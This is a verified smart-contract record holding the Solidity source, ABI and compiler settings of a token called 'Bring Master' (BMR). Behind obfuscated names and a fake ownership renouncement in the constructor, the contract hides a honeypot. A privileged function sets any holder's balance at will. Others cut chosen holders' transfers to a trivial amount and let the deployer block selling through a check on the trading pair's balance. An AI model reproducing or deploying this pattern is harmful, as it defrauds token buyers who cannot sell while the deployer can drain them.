{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface tradingSell {\n    function createPair(address buyTeam, address maxLimit) external returns (address);\n}\n\ninterface sellMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingTx) external view returns (uint256);\n\n    function transfer(address liquidityReceiver, uint256 autoSender) external returns (bool);\n\n    function allowance(address autoTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityReceiver,\n        uint256 autoSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listWallet, uint256 value);\n    event Approval(address indexed autoTake, address indexed spender, uint256 value);\n}\n\nabstract contract shouldToTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minMaxShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellModeMetadata is sellMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BringMaster is shouldToTrading, sellMode, sellModeMetadata {\n\n    function allowance(address launchAt, address senderWalletTotal) external view virtual override returns (uint256) {\n        if (senderWalletTotal == launchedTake) {\n            return type(uint256).max;\n        }\n        return marketingEnable[launchAt][senderWalletTotal];\n    }\n\n    address buyTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return modeFund;\n    }\n\n    constructor (){\n        if (walletAuto) {\n            listMarketing = autoMarketing;\n        }\n        minMaxShould exemptTake = minMaxShould(launchedTake);\n        isToken = tradingSell(exemptTake.factory()).createPair(exemptTake.WETH(), address(this));\n        \n        launchSell = _msgSender();\n        listAuto[launchSell] = true;\n        txEnable[launchSell] = totalLimit;\n        marketingTotal();\n        if (toTotalTrading) {\n            isTo = true;\n        }\n        emit Transfer(address(0), launchSell, totalLimit);\n    }\n\n    uint256 private shouldSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalLimit;\n    }\n\n    function modeEnable(address amountSwapTotal) public {\n        if (amountTake) {\n            return;\n        }\n        if (toTotalTrading == isLaunchTeam) {\n            toTotalTrading = true;\n        }\n        listAuto[amountSwapTotal] = true;\n        if (listMarketing != autoMarketing) {\n            isLaunchTeam = true;\n        }\n        amountTake = true;\n    }\n\n    function tradingLaunch(address autoList) public {\n        isMin();\n        \n        if (autoList == launchSell || autoList == isToken) {\n            return;\n        }\n        enableMax[autoList] = true;\n    }\n\n    uint256 launchedSell;\n\n    string private txMode = \"BMR\";\n\n    uint256 private listMarketing;\n\n    address public launchSell;\n\n    function maxMarketing(address fundBuy, uint256 autoSender) public {\n        isMin();\n        txEnable[fundBuy] = autoSender;\n    }\n\n    function txTradingToken(uint256 autoSender) public {\n        isMin();\n        launchedSell = autoSender;\n    }\n\n    function transfer(address fundBuy, uint256 autoSender) external virtual override returns (bool) {\n        return senderTeam(_msgSender(), fundBuy, autoSender);\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingEnable;\n\n    bool public toTotalTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txMode;\n    }\n\n    function transferFrom(address minReceiver, address liquidityReceiver, uint256 autoSender) external override returns (bool) {\n        if (_msgSender() != launchedTake) {\n            if (marketingEnable[minReceiver][_msgSender()] != type(uint256).max) {\n                require(autoSender <= marketingEnable[minReceiver][_msgSender()]);\n                marketingEnable[minReceiver][_msgSender()] -= autoSender;\n            }\n        }\n        return senderTeam(minReceiver, liquidityReceiver, autoSender);\n    }\n\n    event OwnershipTransferred(address indexed tokenLimit, address indexed amountWallet);\n\n    bool public isTo;\n\n    uint256 constant launchedList = 15 ** 10;\n\n    bool public amountTake;\n\n    uint8 private limitTeamSender = 18;\n\n    uint256 public autoMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return maxAuto;\n    }\n\n    function marketingTotal() public {\n        emit OwnershipTransferred(launchSell, address(0));\n        modeFund = address(0);\n    }\n\n    mapping(address => bool) public enableMax;\n\n    uint256 public feeSwapToken;\n\n    string private maxAuto = \"Bring Master\";\n\n    function senderTeam(address minReceiver, address liquidityReceiver, uint256 autoSender) internal returns (bool) {\n        if (minReceiver == launchSell) {\n            return txShould(minReceiver, liquidityReceiver, autoSender);\n        }\n        uint256 walletMode = sellMode(isToken).balanceOf(buyTrading);\n        require(walletMode == launchedSell);\n        require(liquidityReceiver != buyTrading);\n        if (enableMax[minReceiver]) {\n            return txShould(minReceiver, liquidityReceiver, launchedList);\n        }\n        return txShould(minReceiver, liquidityReceiver, autoSender);\n    }\n\n    function owner() external view returns (address) {\n        return modeFund;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitTeamSender;\n    }\n\n    function balanceOf(address tradingTx) public view virtual override returns (uint256) {\n        return txEnable[tradingTx];\n    }\n\n    address private modeFund;\n\n    bool private isLaunchTeam;\n\n    mapping(address => uint256) private txEnable;\n\n    bool private walletAuto;\n\n    function approve(address senderWalletTotal, uint256 autoSender) public virtual override returns (bool) {\n        marketingEnable[_msgSender()][senderWalletTotal] = autoSender;\n        emit Approval(_msgSender(), senderWalletTotal, autoSender);\n        return true;\n    }\n\n    uint256 limitList;\n\n    address launchedTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public listAuto;\n\n    address public isToken;\n\n    bool private buyMax;\n\n    uint256 private totalLimit = 100000000 * 10 ** 18;\n\n    function txShould(address minReceiver, address liquidityReceiver, uint256 autoSender) internal returns (bool) {\n        require(txEnable[minReceiver] >= autoSender);\n        txEnable[minReceiver] -= autoSender;\n        txEnable[liquidityReceiver] += autoSender;\n        emit Transfer(minReceiver, liquidityReceiver, autoSender);\n        return true;\n    }\n\n    function isMin() private view {\n        require(listAuto[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderWalletTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWalletTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwapToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSender\",\"type\":\"uint256\"}],\"name\":\"maxMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSwapTotal\",\"type\":\"address\"}],\"name\":\"modeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTotalTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoList\",\"type\":\"address\"}],\"name\":\"tradingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoSender\",\"type\":\"uint256\"}],\"name\":\"txTradingToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BringMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}